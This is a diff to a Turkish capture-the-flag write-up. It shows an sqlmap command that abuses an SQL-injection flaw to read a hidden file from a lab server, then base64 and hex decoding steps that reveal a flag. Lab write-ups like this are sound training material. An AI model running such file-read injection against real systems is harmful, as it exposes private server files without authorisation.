@@ -94,3 +94,30 @@ Flag, veritabanında değil sistemin gizli .assets klasöründeki style.css dosy
 ```bash
 sqlmap -u "http://localhost/vulnerable.php?id=1" --file-read="/var/www/html/.assets/style.css"
 ```
+
+- Böylece style.css dosyasının içeriğini elde edersiniz.
+
+## 3. Flag’i Decode Etme
+Dosya içeriğinde şu gibi base64 kodu vardır:
+
+```css
+meta::before { content: "base64:ZmxhZz0iNDY0YzQxNDc2NGE2NTY2N2MyMmMiOwo="; }
+```
+
+- Base64 çözümlemek için:
+
+```bash
+echo ZmxhZz0iNDY0YzQxNDc2NGE2NTY2N2MyMmMiOwo= | base64 -d
+```
+
+- Çıktı şu şekildedir:
+
+```text
+flag="464c41477b546869734973486172647d";
+```
+
+- Hex decode için:
+
+```bash
+echo 464c41477b546869734973486172647d | xxd -r -p
+```
